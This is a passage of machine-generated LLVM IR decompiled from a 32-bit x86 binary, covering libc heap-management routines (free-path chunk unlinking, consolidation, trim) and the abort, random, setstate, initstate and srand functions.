  %v1_804ae8f = icmp eq i1 %v5_804ae8b, false
  br i1 %v1_804ae8f, label %dec_label_pc_804aeb2, label %dec_label_pc_804ae91

dec_label_pc_804ae91:                             ; preds = %dec_label_pc_804ae79
  %v2_804ae91 = inttoptr i32 %v1_804ae39 to i32*
  %v3_804ae91 = load i32, i32* %v2_804ae91, align 4
  store i32 %v3_804ae91, i32* @ebp, align 4
  %v2_804ae96 = sub i32 %v1_804ae39, %v3_804ae91
  store i32 %v2_804ae96, i32* %eax.global-to-local, align 4
  %v1_804ae98 = add i32 %v2_804ae96, 8
  %v2_804ae98 = inttoptr i32 %v1_804ae98 to i32*
  %v3_804ae98 = load i32, i32* %v2_804ae98, align 4
  store i32 %v3_804ae98, i32* @edi, align 4
  %v1_804ae9b = add i32 %v2_804ae96, 12
  %v2_804ae9b = inttoptr i32 %v1_804ae9b to i32*
  %v3_804ae9b = load i32, i32* %v2_804ae9b, align 4
  store i32 %v3_804ae9b, i32* @edx, align 4
  %v1_804ae9e = add i32 %v3_804ae98, 12
  %v2_804ae9e = inttoptr i32 %v1_804ae9e to i32*
  %v3_804ae9e = load i32, i32* %v2_804ae9e, align 4
  store i32 %v3_804ae9e, i32* @ecx, align 4
  %v12_804aea1 = icmp eq i32 %v3_804ae9e, %v2_804ae96
  %v1_804aea3 = icmp eq i1 %v12_804aea1, false
  br i1 %v1_804aea3, label %dec_label_pc_804aee1, label %dec_label_pc_804aea5

dec_label_pc_804aea5:                             ; preds = %dec_label_pc_804ae91
  %v1_804aea5 = add i32 %v3_804ae9b, 8
  %v2_804aea5 = inttoptr i32 %v1_804aea5 to i32*
  %v3_804aea5 = load i32, i32* %v2_804aea5, align 4
  %v15_804aea5 = icmp eq i32 %v3_804aea5, %v3_804ae9e
  %v1_804aea8 = icmp eq i1 %v15_804aea5, false
  br i1 %v1_804aea8, label %dec_label_pc_804aee1, label %dec_label_pc_804aeaa

dec_label_pc_804aeaa:                             ; preds = %dec_label_pc_804aea5
  %v2_804aeaa = add i32 %v3_804ae91, %v1_804ae49
  store i32 %v2_804aeaa, i32* @ebx, align 4
  store i32 %v3_804ae9b, i32* %v2_804ae9e, align 4
  %v0_804aeaf = load i32, i32* @edi, align 4
  %v1_804aeaf = load i32, i32* @edx, align 4
  %v2_804aeaf = add i32 %v1_804aeaf, 8
  %v3_804aeaf = inttoptr i32 %v2_804aeaf to i32*
  store i32 %v0_804aeaf, i32* %v3_804aeaf, align 4
  %v0_804aeb9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804aeb2

dec_label_pc_804aeb2:                             ; preds = %dec_label_pc_804ae79, %dec_label_pc_804aeaa
  %v1_804aec5 = phi i32 [ %v2_804ae81, %dec_label_pc_804ae79 ], [ %v0_804aeb9.pre, %dec_label_pc_804aeaa ]
  %v1_804aeb6 = and i32 %v3_804ae84, -4
  store i32 %v1_804aeb6, i32* @ebp, align 4
  %v1_804aeb9 = load i32, i32* @global_var_805462c.38, align 4
  %v12_804aeb9 = icmp eq i32 %v1_804aec5, %v1_804aeb9
  br i1 %v12_804aeb9, label %dec_label_pc_804af13, label %dec_label_pc_804aec1

dec_label_pc_804aec1:                             ; preds = %dec_label_pc_804aeb2
  %v2_804aec1 = add i32 %v1_804aec5, 4
  %v3_804aec1 = add i32 %v2_804aec1, %v1_804aeb6
  %v4_804aec1 = inttoptr i32 %v3_804aec1 to i32*
  %v5_804aec1 = load i32, i32* %v4_804aec1, align 4
  store i32 %v5_804aec1, i32* %eax.global-to-local, align 4
  %v3_804aec5 = inttoptr i32 %v2_804aec1 to i32*
  store i32 %v1_804aeb6, i32* %v3_804aec5, align 4
  %v0_804aec8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aec8 = urem i32 %v0_804aec8, 2
  %v2_804aec8 = icmp eq i32 %v1_804aec8, 0
  store i32 %v1_804aec8, i32* %eax.global-to-local, align 4
  %v1_804aecd = icmp eq i1 %v2_804aec8, false
  br i1 %v1_804aecd, label %dec_label_pc_804aeee, label %dec_label_pc_804aecf

dec_label_pc_804aecf:                             ; preds = %dec_label_pc_804aec1
  %v0_804aecf = load i32, i32* @esi, align 4
  %v1_804aecf = add i32 %v0_804aecf, 8
  %v2_804aecf = inttoptr i32 %v1_804aecf to i32*
  %v3_804aecf = load i32, i32* %v2_804aecf, align 4
  store i32 %v3_804aecf, i32* @edx, align 4
  %v1_804aed2 = add i32 %v0_804aecf, 12
  %v2_804aed2 = inttoptr i32 %v1_804aed2 to i32*
  %v3_804aed2 = load i32, i32* %v2_804aed2, align 4
  store i32 %v3_804aed2, i32* %eax.global-to-local, align 4
  %v1_804aed5 = add i32 %v3_804aecf, 12
  %v2_804aed5 = inttoptr i32 %v1_804aed5 to i32*
  %v3_804aed5 = load i32, i32* %v2_804aed5, align 4
  store i32 %v3_804aed5, i32* @edi, align 4
  %v12_804aed8 = icmp eq i32 %v3_804aed5, %v0_804aecf
  %v1_804aeda = icmp eq i1 %v12_804aed8, false
  br i1 %v1_804aeda, label %dec_label_pc_804aee1, label %dec_label_pc_804aedc

dec_label_pc_804aedc:                             ; preds = %dec_label_pc_804aecf
  %v1_804aedc = add i32 %v3_804aed2, 8
  %v2_804aedc = inttoptr i32 %v1_804aedc to i32*
  %v3_804aedc = load i32, i32* %v2_804aedc, align 4
  %v15_804aedc = icmp eq i32 %v3_804aedc, %v3_804aed5
  br i1 %v15_804aedc, label %dec_label_pc_804aee6, label %dec_label_pc_804aee1

dec_label_pc_804aee1:                             ; preds = %dec_label_pc_804aea5, %dec_label_pc_804ae91, %dec_label_pc_804aedc, %dec_label_pc_804aecf
  %v0_804aee1 = call i32 @abort()
  store i32 %v0_804aee1, i32* %eax.global-to-local, align 4
  %v1_804aee6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804aee6

dec_label_pc_804aee6:                             ; preds = %dec_label_pc_804aedc, %dec_label_pc_804aee1
  %v1_804aee6 = phi i32 [ %v3_804aecf, %dec_label_pc_804aedc ], [ %v1_804aee6.pre, %dec_label_pc_804aee1 ]
  %v0_804aee6 = phi i32 [ %v3_804aed2, %dec_label_pc_804aedc ], [ %v0_804aee1, %dec_label_pc_804aee1 ]
  %v2_804aee6 = add i32 %v1_804aee6, 12
  %v3_804aee6 = inttoptr i32 %v2_804aee6 to i32*
  store i32 %v0_804aee6, i32* %v3_804aee6, align 4
  %v0_804aee9 = load i32, i32* @ebx, align 4
  %v1_804aee9 = load i32, i32* @ebp, align 4
  %v2_804aee9 = add i32 %v1_804aee9, %v0_804aee9
  store i32 %v2_804aee9, i32* @ebx, align 4
  %v0_804aeeb = load i32, i32* @edx, align 4
  %v1_804aeeb = load i32, i32* %eax.global-to-local, align 4
  %v2_804aeeb = add i32 %v1_804aeeb, 8
  %v3_804aeeb = inttoptr i32 %v2_804aeeb to i32*
  store i32 %v0_804aeeb, i32* %v3_804aeeb, align 4
  br label %dec_label_pc_804aeee

dec_label_pc_804aeee:                             ; preds = %dec_label_pc_804aec1, %dec_label_pc_804aee6
  %v0_804aeee = load i32, i32* @global_var_805463c.56, align 4
  store i32 %v0_804aeee, i32* %eax.global-to-local, align 4
  %v0_804aef3 = load i32, i32* @ecx, align 4
  %v1_804aef3 = add i32 %v0_804aef3, 12
  %v2_804aef3 = inttoptr i32 %v1_804aef3 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804aef3, align 4
  %v0_804aefa = load i32, i32* @ebx, align 4
  %v1_804aefa = load i32, i32* @ecx, align 4
  %v3_804aefa = add i32 %v1_804aefa, %v0_804aefa
  %v4_804aefa = inttoptr i32 %v3_804aefa to i32*
  store i32 %v0_804aefa, i32* %v4_804aefa, align 4
  %v0_804aefd = load i32, i32* %eax.global-to-local, align 4
  %v1_804aefd = load i32, i32* @ecx, align 4
  %v2_804aefd = add i32 %v1_804aefd, 8
  %v3_804aefd = inttoptr i32 %v2_804aefd to i32*
  store i32 %v0_804aefd, i32* %v3_804aefd, align 4
  %v0_804af00 = load i32, i32* @ecx, align 4
  %v1_804af00 = load i32, i32* %eax.global-to-local, align 4
  %v2_804af00 = add i32 %v1_804af00, 12
  %v3_804af00 = inttoptr i32 %v2_804af00 to i32*
  store i32 %v0_804af00, i32* %v3_804af00, align 4
  %v0_804af03 = load i32, i32* @ebx, align 4
  %v1_804af05 = or i32 %v0_804af03, 1
  store i32 %v1_804af05, i32* %eax.global-to-local, align 4
  %v0_804af08 = load i32, i32* @ecx, align 4
  store i32 %v0_804af08, i32* @global_var_805463c.56, align 4
  %v2_804af0e = add i32 %v0_804af08, 4
  %v3_804af0e = inttoptr i32 %v2_804af0e to i32*
  store i32 %v1_804af05, i32* %v3_804af0e, align 4
  br label %dec_label_pc_804af23

dec_label_pc_804af13:                             ; preds = %dec_label_pc_804aeb2
  %v0_804af13 = load i32, i32* @ebx, align 4
  %v2_804af13 = add i32 %v0_804af13, %v1_804aeb6
  store i32 %v2_804af13, i32* @ebx, align 4
  %v1_804af17 = or i32 %v2_804af13, 1
  store i32 %v1_804af17, i32* %eax.global-to-local, align 4
  %v1_804af1a = load i32, i32* @ecx, align 4
  %v2_804af1a = add i32 %v1_804af1a, 4
  %v3_804af1a = inttoptr i32 %v2_804af1a to i32*
  store i32 %v1_804af17, i32* %v3_804af1a, align 4
  %v0_804af1d = load i32, i32* @ecx, align 4
  store i32 %v0_804af1d, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804af23

dec_label_pc_804af23:                             ; preds = %dec_label_pc_804aeee, %dec_label_pc_804af13
  %v0_804af23 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804af23, 131072
  br i1 %tmp, label %dec_label_pc_804af88, label %dec_label_pc_804af2b

dec_label_pc_804af2b:                             ; preds = %dec_label_pc_804af23
  %v0_804af2b = load i8, i8* @global_var_8054600.37, align 512
  %v1_804af2b = and i8 %v0_804af2b, 2
  %v2_804af2b = icmp eq i8 %v1_804af2b, 0
  br i1 %v2_804af2b, label %dec_label_pc_804af44, label %dec_label_pc_804af34

dec_label_pc_804af34:                             ; preds = %dec_label_pc_804af2b
  %v2_804af3c = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804af3c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af44

dec_label_pc_804af44:                             ; preds = %dec_label_pc_804af2b, %dec_label_pc_804af34
  %v0_804af44 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804af44, i32* %eax.global-to-local, align 4
  %v1_804af49 = add i32 %v0_804af44, 4
  %v2_804af49 = inttoptr i32 %v1_804af49 to i32*
  %v3_804af49 = load i32, i32* %v2_804af49, align 4
  %v1_804af4c = and i32 %v3_804af49, -4
  store i32 %v1_804af4c, i32* %eax.global-to-local, align 4
  %v1_804af4f = load i32, i32* @global_var_8054944.54, align 4
  %v7_804af4f = icmp ult i32 %v1_804af4c, %v1_804af4f
  br i1 %v7_804af4f, label %dec_label_pc_804af88, label %dec_label_pc_804af57

dec_label_pc_804af57:                             ; preds = %dec_label_pc_804af44
  %v0_804af57 = load i32, i32* @global_var_8054948.52, align 8
  store i32 %v0_804af57, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  %v0_804af61 = call i32 @__malloc_trim()
  store i32 %v0_804af61, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af88

dec_label_pc_804af68:                             ; preds = %dec_label_pc_804ae70
  %v2_804af68 = inttoptr i32 %v1_804ae39 to i32*
  %v3_804af68 = load i32, i32* %v2_804af68, align 4
  %v0_804af6b = load i32, i32* @global_var_8054950.45, align 16
  %v1_804af6b = add i32 %v0_804af6b, -1
  store i32 %v1_804af6b, i32* @global_var_8054950.45, align 16
  %v2_804af71 = add i32 %v3_804af68, %v1_804ae49
  store i32 %v2_804af71, i32* %eax.global-to-local, align 4
  %v2_804af74 = sub i32 %v1_804ae39, %v3_804af68
  %v0_804af7a = load i32, i32* @global_var_8054964.49, align 4
  %v2_804af7a = sub i32 %v0_804af7a, %v2_804af71
  store i32 %v2_804af7a, i32* @global_var_8054964.49, align 4
  %v4_804af80 = call i32 @munmap(i32 %v2_804af74, i32 %v2_804af71, i32 %v1_804ae49, i32 %v1_804ae49)
  store i32 %v4_804af80, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af88

dec_label_pc_804af88:                             ; preds = %dec_label_pc_804af44, %dec_label_pc_804af23, %dec_label_pc_804af57, %dec_label_pc_804ae50, %dec_label_pc_804af68
  store i32 %v2_804ae23, i32* @eax, align 4
  %v2_804af91 = call i32 @__pthread_return_void(i32 %v2_804ae23, i32 1)
  store i32 %v2_804af91, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804af99

dec_label_pc_804af99:                             ; preds = %entry, %dec_label_pc_804af88
  %.0 = phi i32 [ undef, %entry ], [ %v2_804af91, %dec_label_pc_804af88 ]
  store i32 %v0_804ae08, i32* @ebx, align 4
  store i32 %v0_804ae07, i32* @esi, align 4
  store i32 %v0_804ae06, i32* @edi, align 4
  store i32 %v0_804ae05, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804af68, { 1, 0 }
  uselistorder i32 %v0_804aefa, { 1, 0 }
  uselistorder i32 %v1_804aec8, { 1, 0 }
  uselistorder i32 %v2_804aec1, { 1, 0 }
  uselistorder i32 %v1_804aeb6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804aec5, { 1, 0 }
  uselistorder i32 %v1_804ae49, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804ae41, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ae39, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 12, 10, 11, 13, 14, 15, 16, 17, 18, 21, 22, 19, 20, 23, 24, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* bitcast (i8* @global_var_8054600.37 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8054634.40 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805462c.38, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804af99, { 1, 0 }
  uselistorder label %dec_label_pc_804af88, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804af44, { 1, 0 }
  uselistorder label %dec_label_pc_804af23, { 1, 0 }
  uselistorder label %dec_label_pc_804aeee, { 1, 0 }
  uselistorder label %dec_label_pc_804aee6, { 1, 0 }
  uselistorder label %dec_label_pc_804aee1, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804aeb2, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804afa1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804afae = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8054600.37 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  %v0_804afbb = load i32, i32* @ebx, align 4
  store i32 %v0_804afbb, i32* @eax, align 4
  store i32 %v0_804afa1, i32* @ebx, align 4
  %v0_804afbe = call i32 @__malloc_trim()
  ret i32 %v0_804afbe

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8054600.37 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 3, 1, 2, 4 }
  uselistorder i8* @global_var_8054600.37, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804afd0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  %v12_804afda = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804afdf

dec_label_pc_804afdf:                             ; preds = %dec_label_pc_804afdf.dec_label_pc_804afdf_crit_edge, %entry
  %v0_804afdf = phi i32 [ %v12_804afda, %entry ], [ %v0_804afdf.pre, %dec_label_pc_804afdf.dec_label_pc_804afdf_crit_edge ]
  %v1_804afea19 = phi i32 [ 31, %entry ], [ %v1_804afea, %dec_label_pc_804afdf.dec_label_pc_804afdf_crit_edge ]
  %v2_804afdf = mul i32 %v1_804afea19, 4
  %v3_804afdf = add i32 %v2_804afdf, 152
  %v4_804afdf = add i32 %v3_804afdf, %v0_804afdf
  %v5_804afdf = inttoptr i32 %v4_804afdf to i32*
  store i32 0, i32* %v5_804afdf, align 4
  %v0_804afea.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804afea = add i32 %v0_804afea.pre, -1
  %v9_804afea = icmp slt i32 %v1_804afea, 0
  store i32 %v1_804afea, i32* %eax.global-to-local, align 4
  %v1_804afeb = icmp eq i1 %v9_804afea, false
  br i1 %v1_804afeb, label %dec_label_pc_804afdf.dec_label_pc_804afdf_crit_edge, label %dec_label_pc_804afed

dec_label_pc_804afdf.dec_label_pc_804afdf_crit_edge: ; preds = %dec_label_pc_804afdf
  %v0_804afdf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804afdf

dec_label_pc_804afed:                             ; preds = %dec_label_pc_804afdf
  %v0_804afed = load i32, i32* @ebx, align 4
  %v2_804aff1 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804aff1, i32* @ebx, align 4
  %v4_804aff9 = call i32 @__sigaddset(i32 %v2_804aff1, i32 6, i32 %v0_804afed, i32 %v0_804afed)
  store i32 %v4_804aff9, i32* %eax.global-to-local, align 4
  %v1_804b001 = icmp eq i32 %v4_804aff9, 0
  %v1_804b003 = icmp eq i1 %v1_804b001, false
  br i1 %v1_804b003, label %dec_label_pc_804b013, label %dec_label_pc_804b005

dec_label_pc_804b005:                             ; preds = %dec_label_pc_804afed
  %v0_804b005 = load i32, i32* @ecx, align 4
  %v4_804b00b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v5_804b00b = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_804b00b, i32 0, i32 %v0_804b005)
  store i32 %v5_804b00b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b013

dec_label_pc_804b013:                             ; preds = %dec_label_pc_804afed, %dec_label_pc_804b005
  %v2_804b04b4 = phi i32 [ %v4_804aff9, %dec_label_pc_804afed ], [ %v5_804b00b, %dec_label_pc_804b005 ]
  %v0_804b013 = load i8, i8* @global_var_8052500.58, align 256
  %v1_804b013 = icmp eq i8 %v0_804b013, 0
  %v1_804b01a = icmp eq i1 %v1_804b013, false
  br i1 %v1_804b01a, label %dec_label_pc_804b04b, label %dec_label_pc_804b01c

dec_label_pc_804b01c:                             ; preds = %dec_label_pc_804b013
  store i8 1, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804b023

dec_label_pc_804b023:                             ; preds = %dec_label_pc_804b08a, %dec_label_pc_804b01c
  %v1_804b02b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804b02b, i32* %eax.global-to-local, align 4
  %v1_804b037 = call i32 @__raise(i32 6)
  store i32 %v1_804b037, i32* %eax.global-to-local, align 4
  %v1_804b043 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804b043, i32* %eax.global-to-local, align 4
  %v0_804b04b.pre = load i8, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804b04b

dec_label_pc_804b04b:                             ; preds = %dec_label_pc_804b013, %dec_label_pc_804b023
  %v2_804b04b = phi i32 [ %v2_804b04b4, %dec_label_pc_804b013 ], [ %v1_804b043, %dec_label_pc_804b023 ]
  %v0_804b04b = phi i8 [ %v0_804b013, %dec_label_pc_804b013 ], [ %v0_804b04b.pre, %dec_label_pc_804b023 ]
  %v1_804b04b = zext i8 %v0_804b04b to i32
  %v3_804b04b = and i32 %v2_804b04b, -256
  %v4_804b04b = or i32 %v1_804b04b, %v3_804b04b
  store i32 %v4_804b04b, i32* %eax.global-to-local, align 4
  %v10_804b050 = icmp eq i8 %v0_804b04b, 1
  %v1_804b052 = icmp eq i1 %v10_804b050, false
  br i1 %v1_804b052, label %dec_label_pc_804b0ac, label %dec_label_pc_804b054

dec_label_pc_804b054:                             ; preds = %dec_label_pc_804b04b
  %v2_804b05c = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804b05c, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8052500.58, align 256
  %v3_804b068 = bitcast i32* %stack_var_-272 to i8*
  %v4_804b068 = call i32 @__GI_memset(i8* %v3_804b068, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b07f

dec_label_pc_804b07f:                             ; preds = %dec_label_pc_804b07f.dec_label_pc_804b07f_crit_edge, %dec_label_pc_804b054
  %v0_804b07f = phi i32 [ %v12_804afda, %dec_label_pc_804b054 ], [ %v0_804b07f.pre, %dec_label_pc_804b07f.dec_label_pc_804b07f_crit_edge ]
  %v1_804b08718 = phi i32 [ 31, %dec_label_pc_804b054 ], [ %v1_804b087, %dec_label_pc_804b07f.dec_label_pc_804b07f_crit_edge ]
  %v2_804b07f = mul i32 %v1_804b08718, 4
  %v3_804b07f = add i32 %v2_804b07f, 16
  %v4_804b07f = add i32 %v3_804b07f, %v0_804b07f
  %v5_804b07f = inttoptr i32 %v4_804b07f to i32*
  store i32 -1, i32* %v5_804b07f, align 4
  %v0_804b087.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804b087 = add i32 %v0_804b087.pre, -1
  %v9_804b087 = icmp slt i32 %v1_804b087, 0
  store i32 %v1_804b087, i32* %eax.global-to-local, align 4
  %v1_804b088 = icmp eq i1 %v9_804b087, false
  br i1 %v1_804b088, label %dec_label_pc_804b07f.dec_label_pc_804b07f_crit_edge, label %dec_label_pc_804b08a

dec_label_pc_804b07f.dec_label_pc_804b07f_crit_edge: ; preds = %dec_label_pc_804b07f
  %v0_804b07f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b07f

dec_label_pc_804b08a:                             ; preds = %dec_label_pc_804b07f
  store i32 %v2_804b05c, i32* %eax.global-to-local, align 4
  %v4_804b09f = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804b09f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b023

dec_label_pc_804b0ac:                             ; preds = %dec_label_pc_804b04b
  %v10_804b0ac = icmp eq i8 %v0_804b04b, 2
  %v1_804b0ae = icmp eq i1 %v10_804b0ac, false
  br i1 %v1_804b0ae, label %dec_label_pc_804b0b8, label %dec_label_pc_804b0b0

dec_label_pc_804b0b0:                             ; preds = %dec_label_pc_804b0ac
  store i8 3, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804b0b8

dec_label_pc_804b0b8:                             ; preds = %dec_label_pc_804b0ac, %dec_label_pc_804b0b0
  %v0_804b0b8 = phi i8 [ %v0_804b04b, %dec_label_pc_804b0ac ], [ 3, %dec_label_pc_804b0b0 ]
  %v9_804b0b8 = icmp eq i8 %v0_804b0b8, 3
  %v1_804b0bf = icmp eq i1 %v9_804b0b8, false
  br i1 %v1_804b0bf, label %dec_label_pc_804b0d2, label %dec_label_pc_804b0c1

dec_label_pc_804b0c1:                             ; preds = %dec_label_pc_804b0b8
  store i8 4, i8* @global_var_8052500.58, align 256
  %v1_804b0cd = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804b0d2:                             ; preds = %dec_label_pc_804b0b8, %dec_label_pc_804b0d2
  br label %dec_label_pc_804b0d2

; uselistorder directives
  uselistorder i32 %v1_804b087, { 2, 1, 0 }
  uselistorder i8 %v0_804b04b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804afea, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i8* @global_var_8052500.58, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804b0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b8, { 1, 0 }
  uselistorder label %dec_label_pc_804b04b, { 1, 0 }
  uselistorder label %dec_label_pc_804b013, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804b0e6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b0e6, i32* @ebx, align 4
  %v2_804b0eb = call i32 @__pthread_return_void(i32 %v2_804b0e6, i32 134526871)
  %v1_804b0f7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v2_804b0fe = ptrtoint i32* %stack_var_-8 to i32
  %v3_804b108 = call i32 @__GI_random_r(i32* nonnull @global_var_805208c, i32 %v2_804b0fe)
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804b112 = call i32 @__pthread_return_void(i32 %v2_804b0e6, i32 1)
  %v3_804b117 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_804b117
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804b131 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b131, i32* @eax, align 4
  %v2_804b136 = call i32 @__pthread_return_void(i32 %v2_804b131, i32 134526871)
  %v1_804b142 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v0_804b147 = load i32, i32* bitcast (i32** @global_var_8052094.62 to i32*), align 4
  store i32 %v0_804b147, i32* @ebx, align 4
  %v3_804b158 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805208c)
  %v2_804b160 = icmp slt i32 %v3_804b158, 0
  br i1 %v2_804b160, label %dec_label_pc_804b167, label %dec_label_pc_804b164

dec_label_pc_804b164:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_8052090.63 to i32), i32* @esi, align 4
  br label %dec_label_pc_804b167

dec_label_pc_804b167:                             ; preds = %entry, %dec_label_pc_804b164
  store i32 %v2_804b131, i32* @eax, align 4
  %v2_804b170 = call i32 @__pthread_return_void(i32 %v2_804b131, i32 1)
  %v0_804b178 = load i32, i32* @esi, align 4
  ret i32 %v0_804b178

; uselistorder directives
  uselistorder label %dec_label_pc_804b167, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_804b18c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b18c, i32* @ebx, align 4
  %v2_804b191 = call i32 @__pthread_return_void(i32 %v2_804b18c, i32 134526871)
  %v1_804b19d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  store i32 ptrtoint (i32** @global_var_8052090.63 to i32), i32* @esi, align 4
  %v4_804b1bc = inttoptr i32 %arg2 to i32*
  %v5_804b1bc = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804b1bc, i32 %arg3, i32 ptrtoint (i32* @global_var_805208c to i32))
  store i32 %v5_804b1bc, i32* @eax, align 4
  %v2_804b1c7 = call i32 @__pthread_return_void(i32 %v2_804b18c, i32 1)
  %v0_804b1cf = load i32, i32* @esi, align 4
  ret i32 %v0_804b1cf
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b1d4 = load i32, i32* @ebx, align 4
  store i32 %v0_804b1d4, i32* %stack_var_-4, align 4
  %v2_804b1e2 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804b1e2, i32* @ebx, align 4
  %v2_804b1e7 = call i32 @__pthread_return_void(i32 %v2_804b1e2, i32 134526871)
  %v1_804b1f3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v3_804b203 = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805208c)
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804b20d = call i32 @__pthread_return_void(i32 %v2_804b1e2, i32 1)
  %v2_804b215 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b215, i32* @ebx, align 4
  ret i32 %v2_804b20d

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805208c to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805208c, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_804b21b = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
